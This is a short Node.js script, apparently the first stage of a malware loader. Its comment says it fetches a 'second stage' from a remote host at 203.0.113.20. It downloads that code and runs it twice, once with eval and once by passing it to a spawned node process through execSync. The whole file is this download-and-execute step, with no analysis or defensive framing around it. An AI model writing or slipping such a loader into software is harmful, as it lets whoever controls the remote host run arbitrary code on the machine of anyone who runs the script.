const http = require('node:http');
const { execSync } = require('node:child_process');

// Fetch the second stage from a remote host and run it immediately.
http.get('http://203.0.113.20/stage2.js', (response) => {
  let code = '';
  response.on('data', (chunk) => { code += chunk; });
  response.on('end', () => {
    eval(code);
    execSync('node -e "' + code.replace(/"/g, '\\"') + '"');
  });
});
